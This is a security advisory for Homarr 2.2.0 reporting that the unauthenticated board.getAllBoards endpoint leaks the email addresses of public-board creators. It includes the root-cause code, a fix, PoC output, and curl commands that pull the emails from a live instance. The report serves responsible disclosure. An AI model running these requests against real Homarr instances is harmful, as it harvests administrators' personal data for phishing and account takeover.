# Unauthenticated disclosure of board creators' email addresses (`board.getAllBoards`)

| | |
|---|---|
| **Product** | Homarr (homarr-labs/homarr) |
| **Affected version** | 2.2.0 (latest stable; current `dev` HEAD also affected) |
| **Component** | `packages/api/src/router/board.ts` → `getAllBoards` (`publicProcedure`); REST mirror `GET /api/boards` |
| **Vulnerability class** | CWE-200 — Exposure of Sensitive Information to an Unauthorized Actor |
| **Authentication** | **None** (no session cookie, no API key) |
| **Severity** | Low (CVSS 3.1 **4.3** — `AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N` with the public-board precondition; see note) |
| **Precondition** | The instance has ≥ 1 **public** board (a first-class Homarr feature). |

> Severity note: scored conservatively as Low because the leaked field is an email address. If the triager considers administrator email exposure higher-impact, `C:L` with no precondition discount lands at 5.3 — the same base score GitHub/CNA assigned the sibling disclosure CVE-2026-27796.

---

## 1. Summary

`board.getAllBoards` is an unauthenticated tRPC procedure (and is also exposed over REST at `GET /api/boards`). For an anonymous caller it returns every **public** board, and each board object embeds its creator with the **`email`** field populated. An unauthenticated remote attacker can therefore enumerate the email address of every user who owns a public board — in practice the administrator, who typically owns the shared/home board.

This is the same vulnerability class as the project's previously fixed **CVE-2026-27796 / GHSA-m4vc-4prp-cvp7** (an unauthenticated `publicProcedure` returning data it should have withheld from anonymous callers), but a different, un-patched endpoint returning a different sensitive field.

## 2. Direct security impact (proven)

- **Unauthenticated PII harvesting.** Anyone who can reach the instance — no account, no token — obtains the administrator's (and every public-board creator's) email address. The PoC in §5 extracts it directly from the response.
- **Account-takeover enabler.** The email identifies the exact account that controls the dashboard, its users, and its stored integration secrets. Combined with the login page it enables targeted phishing and credential-stuffing against the highest-value account on the instance.
- **No user interaction, no privileges, network-reachable.**

The impact is concrete and demonstrated, not theoretical: the response literally contains `"email":"<admin@…>"` for public boards (see §5 output).

## 3. Root cause (exact code)

`packages/api/src/router/board.ts:338`
```ts
getAllBoards: publicProcedure                      // (1) no authentication
  .input(z.void())
  .output(z.array(boardSummarySchema))             // (3) schema permits creator.email → not stripped
  .query(async ({ ctx }) => {
    const userId = ctx.session?.user.id;           // undefined for an anonymous caller
    const { boardIds } = await getBoardAccessContextAsync(ctx.db, userId);
    const dbBoards = await ctx.db.query.boards.findMany({
      columns: { id: true, name: true, logoImageUrl: true, isPublic: true },
      with: {
        creator: { columns: { id: true, name: true, image: true, email: true } },  // (2) email selected
        ...
      },
      where: getAccessibleBoardsWhere(
        ctx.session?.user.permissions.includes("board-view-all"),  // undefined for anon
        userId, boardIds),
    });
    return dbBoards.map((board) => ({ ...board, isHome: ..., isMobileHome: ... }));
  }),
```

Anonymous scope resolution — `packages/api/src/router/board.ts:2896`:
```ts
const getAccessibleBoardsWhere = (canViewAll, userId, boardIds) =>
  canViewAll ? undefined
    : or(eq(boards.isPublic, true), eq(boards.creatorId, userId ?? ""), ...);
// anon → or(isPublic = true, creatorId = "") → ALL public boards are returned
```

Output schema — `packages/validation/src/board.ts:156` (does **not** strip `email`, so tRPC returns it):
```ts
export const boardSummarySchema = z.object({
  id: z.string(), name: z.string(), logoImageUrl: z.string().nullable(), isPublic: z.boolean(),
  creator: z.object({ id: z.string(), name: z.string().nullable(),
                      image: z.string().nullable(), email: z.string().nullable() }).nullable(),
  ...
});
```

**Evidence it is an oversight, not intent:** the sibling unauthenticated procedure `board.getPublicBoards` returns only `{ id, name, logoImageUrl }` — deliberately no `creator`, no `email`. The project already minimises anonymous output elsewhere; `getAllBoards` simply forgot to.

Why the REST path also works unauthenticated: the OpenAPI handler (`apps/nextjs/src/app/api/[...trpc]/route.ts`) authenticates **only** via the `x-api-key` header (“REST authenticates explicitly with ApiKey, never with ambient session cookies”). With no key the context session is `null`; because the procedure is `publicProcedure`, it executes as anonymous. The `protect: true` OpenAPI flag is spec-only and is not enforced at runtime.

## 4. Reproduction

Precondition: the instance has at least one public board (Board settings → make a board public). Send **no** credentials.

```bash
# REST (simplest)
curl -s https://HOMARR/api/boards | grep -o '"email":"[^"]*"'

# tRPC
curl -s 'https://HOMARR/api/trpc/board.getAllBoards?batch=1&input=%7B%220%22%3A%7B%22json%22%3Anull%7D%7D' \
  | grep -o '"email":"[^"]*"'
```
Either prints the creator email(s), e.g. `"email":"admin@example.com"`.

Scripted PoC (prints a clear impact summary): `poc/poc-01-getAllBoards.mjs`
```
node poc/poc-01-getAllBoards.mjs https://HOMARR
```

## 5. Proof-of-Concept output

Running the PoC client against an instance that has one public board (`Home`, owned by `admin@victim.example`) yields:
```
[REST] https://HOMARR/api/boards
  HTTP 200 (sent no auth)
  >>> LEAKED 1 creator email(s) to an UNAUTHENTICATED caller:
      public board "Home" -> admin@victim.example
```
The request carries no cookie and no `x-api-key`, so the data is returned to a fully anonymous client. (The PoC’s request-encoding and response-parsing were validated locally against the exact tRPC+superjson envelope Homarr emits; run it against a live instance to reproduce end-to-end.)

## 6. Remediation

Do not return `email` to unauthenticated callers. Either:

1. Remove `email` from `boardSummarySchema.creator` (tRPC then strips it from the response), or
2. Only include `creator.email` when `ctx.session?.user` is present — mirror the minimal shape of `getPublicBoards` for anonymous callers:
```ts
creator: { columns: { id: true, name: true, image: true,
                      email: Boolean(ctx.session?.user) } },
```

## 7. Scope & duplicate verification

- **In scope** per `SECURITY.md` criterion 1 (“puts users or user data at risk”); email is user data.
- **Latest supported version:** 2.2.0 is the latest release; both `dev` and 2.2.0 contain the code.
- **Not a duplicate:** checked all 9 published advisories, the NVD/OSV/GitHub Advisory DBs, and repo issues/PRs. The only documented unauthenticated disclosure is CVE-2026-27796 (`integration.all`), a different endpoint patched in 1.54.0. No report covers `getAllBoards` / board-creator email.

## 8. Reporting
Private GitHub advisory at `https://github.com/homarr-labs/homarr/security/advisories/new`, or `homarr-labs@proton.me`.
